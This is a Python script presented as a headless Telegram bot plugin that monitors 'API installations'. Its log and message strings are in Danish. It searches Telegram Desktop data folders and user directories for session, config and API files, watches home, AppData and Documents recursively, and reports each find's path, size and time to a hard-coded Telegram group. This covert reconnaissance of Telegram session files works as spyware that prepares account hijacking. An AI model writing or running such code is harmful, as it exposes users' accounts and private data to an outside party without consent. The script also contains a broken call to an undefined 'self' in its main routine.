#!/usr/bin/env python3
"""
Headless Telegram Bot Plugin - Automatically sends API information to group
Monitors for API installations and sends updates automatically
"""

import sys
import json
import asyncio
import io
import os
import time
import threading
import glob
import hashlib
from pathlib import Path
from telethon import TelegramClient, events
from telethon.errors import FloodWaitError, SessionPasswordNeededError
from datetime import datetime
import watchdog.observers
from watchdog.events import FileSystemEventHandler

# Force UTF-8 for standard streams on Windows
if sys.platform == 'win32':
    try:
        sys.stdin = io.TextIOWrapper(sys.stdin.buffer, encoding='utf-8', errors='replace')
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
        sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')
    except Exception:
        pass

class APIMonitor(FileSystemEventHandler):
    """Monitors for API installation changes"""
    
    def __init__(self, bot_plugin):
        self.bot_plugin = bot_plugin
        self.last_check = time.time()
        
    def on_modified(self, event):
        if event.is_directory:
            return
            
        # Check for API-related file changes
        if any(keyword in event.src_path.lower() for keyword in ['api', 'telegram', 'config', 'session']):
            current_time = time.time()
            if current_time - self.last_check > 5:  # Debounce
                self.last_check = current_time
                asyncio.create_task(self.bot_plugin.check_and_send_api_update())
                
    def on_created(self, event):
        if event.is_directory:
            return
            
        # Check for new API-related files
        if any(keyword in event.src_path.lower() for keyword in ['api', 'telegram', 'config', 'session']):
            current_time = time.time()
            if current_time - self.last_check > 5:  # Debounce
                self.last_check = current_time
                asyncio.create_task(self.bot_plugin.check_and_send_api_update())

class TelegramBotPlugin:
    def __init__(self, config):
        self.config = config
        self.client = None
        self.is_running = False
        self.target_group_id = config.get('target_group_id', -1002952712535)
        self.api_registry = {}  # Store detected APIs
        self.monitor_thread = None
        self.observer = None
        
    def log(self, message, type="info"):
        """Send log message to main application"""
        print(json.dumps({
            "type": "log", 
            "data": {
                "message": message, 
                "type": type,
                "timestamp": datetime.now().isoformat()
            }
        }), flush=True)
        
    async def scan_for_apis(self):
        """Enhanced scan for installed APIs on system"""
        detected_apis = []
        
        # Extended API locations with more comprehensive search
        api_locations = [
            os.path.expanduser("~/.telegram_api"),
            os.path.expanduser("~/AppData/Local/TelegramDesktop"),
            os.path.expanduser("~/.local/share/TelegramDesktop"),
            os.path.expanduser("~/AppData/Roaming/TelegramDesktop"),
            "C:\\ProgramData\\Telegram",
            "C:\\Program Files\\Telegram Desktop",
            "C:\\Users\\*\\AppData\\Local\\TelegramDesktop",
            "C:\\Users\\*\\AppData\\Roaming\\TelegramDesktop"
        ]
        
        # Also scan for any .session files in user directories
        user_dirs = [
            os.path.expanduser("~"),
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Desktop")
        ]
        
        for location in api_locations:
            try:
                # Handle wildcards in paths
                if '*' in location:
                    import glob
                    matching_dirs = glob.glob(location)
                    for actual_location in matching_dirs:
                        if os.path.exists(actual_location):
                            detected_apis.extend(await self._scan_directory(actual_location, location))
                else:
                    if os.path.exists(location):
                        detected_apis.extend(await self._scan_directory(location, location))
            except Exception as e:
                self.log(f"Error scanning {location}: {str(e)}", "warning")
                
        # Scan user directories for session files
        for user_dir in user_dirs:
            try:
                if os.path.exists(user_dir):
                    session_files = glob.glob(os.path.join(user_dir, "*.session"))
                    for session_file in session_files:
                        file_time = os.path.getmtime(session_file)
                        detected_apis.append({
                            'path': session_file,
                            'modified': datetime.fromtimestamp(file_time).isoformat(),
                            'location': user_dir,
                            'type': 'session_file'
                        })
            except Exception as e:
                self.log(f"Error scanning {user_dir}: {str(e)}", "warning")
                
        return detected_apis
        
    async def _scan_directory(self, location, display_name):
        """Helper method to scan a specific directory"""
        detected_apis = []
        
        for root, dirs, files in os.walk(location):
            for file in files:
                if any(keyword in file.lower() for keyword in ['api', 'config', 'session', 'telegram']):
                    file_path = os.path.join(root, file)
                    file_time = os.path.getmtime(file_path)
                    
                    # Create unique key for this API
                    file_hash = hashlib.md5(file_path.encode()).hexdigest()
                    api_key = f"{display_name}:{file_hash}"
                    
                    if api_key not in self.api_registry or self.api_registry[api_key] < file_time:
                        self.api_registry[api_key] = file_time
                        detected_apis.append({
                            'path': file_path,
                            'modified': datetime.fromtimestamp(file_time).isoformat(),
                            'location': display_name,
                            'type': 'api_file'
                        })
        return detected_apis
        
    async def send_api_update(self, api_info):
        """Send API update information to target group"""
        try:
            # Create more informative message
            file_size = "Unknown"
            if os.path.exists(api_info['path']):
                try:
                    file_size = os.path.getsize(api_info['path'])
                    if file_size < 1024:
                        file_size = f"{file_size} bytes"
                    elif file_size < 1024 * 1024:
                        file_size = f"{file_size // 1024} KB"
                    else:
                        file_size = f"{file_size // (1024 * 1024)} MB"
                except:
                    pass
                    
            api_message = f"""
🔔 *Ny API Installation Opdaget* 🔔

📁 *Filsti*: `{api_info['path']}`
📂 *Type*: {api_info.get('type', 'Ukendt')}
📏 *Størrelse*: {file_size}
📍 *Placering*: {api_info['location']}
⏰ *Opdaget*: {api_info['modified']}
🤖 *Bot Status*: Automatisk overvågning aktiv

📱 *Målgruppe*: {self.target_group_id}
🕐 *Scannings tid*: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

✅ *API information automatisk sendt og overvåget*
            """
            
            # Send message to target group
            await self.client.send_message(
                self.target_group_id,
                api_message,
                parse_mode='markdown'
            )
            self.log(f"API update sendt til gruppe {self.target_group_id}", "success")
            
        except Exception as e:
            self.log(f"Fejl ved afsendelse af API opdatering: {str(e)}", "error")
            
    async def check_and_send_api_update(self):
        """Check for new APIs and send updates if found"""
        if not self.is_running:
            return
            
        detected_apis = await self.scan_for_apis()
        
        if detected_apis:
            self.log(f"Opdaget {len(detected_apis)} ny/opdaterede API installationer", "info")
            for api_info in detected_apis:
                await self.send_api_update(api_info)
                await asyncio.sleep(2)  # Rate limiting
                
    def start_file_monitoring(self):
        """Enhanced file system monitoring"""
        try:
            # Monitor common locations for API installations
            paths_to_monitor = [
                os.path.expanduser("~"),
                os.path.expanduser("~/AppData/Local"),
                os.path.expanduser("~/AppData/Roaming"),
                os.path.expanduser("~/.local/share"),
                os.path.expanduser("~/Documents"),
                os.path.expanduser("~/Desktop")
            ]
            
            self.observer = watchdog.observers.Observer()
            
            for path in paths_to_monitor:
                if os.path.exists(path):
                    try:
                        self.observer.schedule(APIMonitor(self), path, recursive=True)
                        self.log(f"Startet overvågning af {path}", "info")
                    except Exception as e:
                        self.log(f"Fejl ved overvågning af {path}: {str(e)}", "warning")
                    
            self.observer.start()
            self.log("Forbedret filsystem overvågning startet", "success")
            
        except Exception as e:
            self.log(f"Fejl ved start af filsystem overvågning: {str(e)}", "error")
            
    async def initialize(self):
        """Initialize Telegram client"""
        try:
            self.log(f"Initialiserer Forbedret Telegram Bot Plugin...")
            
            # Create session file path
            session_name = f"headless_bot_plugin_{self.config.get('api_id', 'default')}"
            
            # Initialize Telegram client
            self.client = TelegramClient(
                session_name,
                self.config.get('api_id'),
                self.config.get('api_hash')
            )
            
            await self.client.start()
            self.is_running = True
            self.log("Forbedret Hovedløs Telegram Bot Plugin initialiseret succesfuldt!", "success")
            
            # Start file monitoring
            self.start_file_monitoring()
            
            # Perform initial API scan
            await self.check_and_send_api_update()
            
            # Start periodic scanning
            asyncio.create_task(self.periodic_scan())
            
        except SessionPasswordNeededError:
            self.log("2FA adgangskode påkrævet", "warning")
            print(json.dumps({"type": "needsPassword"}), flush=True)
            
        except Exception as e:
            self.log(f"Fejl ved initialisering: {str(e)}", "error")
            raise
            
    async def periodic_scan(self):
        """Enhanced periodic scanning"""
        while self.is_running:
            try:
                await asyncio.sleep(300)  # Scan every 5 minutes
                await self.check_and_send_api_update()
            except Exception as e:
                self.log(f"Fejl i periodisk scanning: {str(e)}", "error")
                # Continue running even if scan fails
                
    async def start(self):
        """Start bot plugin"""
        if not self.is_running:
            await self.initialize()
            
    async def stop(self):
        """Stop bot plugin"""
        self.is_running = False
        
        if self.observer:
            self.observer.stop()
            self.observer.join()
            
        if self.client:
            await self.client.disconnect()
            self.log("Forbedret Hovedløs Telegram Bot Plugin stoppet", "info")
            
    def send_code(self, code):
        """Send verification code"""
        if self.client:
            # This would be handled by the main Telegram client
            pass
            
    def send_password(self, password):
        """Send 2FA password"""
        if self.client:
            # This would be handled by the main Telegram client
            pass

# Main execution for headless operation
if __name__ == "__main__":
    # Check if running as subprocess with config argument
    if len(sys.argv) > 1:
        try:
            config = json.loads(sys.argv[1])
        except:
            config = {
                'api_id': '123456',
                'api_hash': 'abcdef123456',
                'target_group_id': -1002952712535
            }
    else:
        # Default configuration for headless operation
        config = {
            'api_id': '123456',
            'api_hash': 'abcdef123456',
            'target_group_id': -1002952712535
        }
    
    plugin = TelegramBotPlugin(config)
    
    async def main():
        try:
            await plugin.start()
            self.log("Headless bot plugin started - monitoring for API installations", "success")
            
            # Keep the plugin running
            while plugin.is_running:
                await asyncio.sleep(1)
                
        except KeyboardInterrupt:
            plugin.log("Shutting down headless bot plugin...", "info")
        except Exception as e:
            plugin.log(f"Fatal error: {str(e)}", "error")
        finally:
            await plugin.stop()
        
    asyncio.run(main())
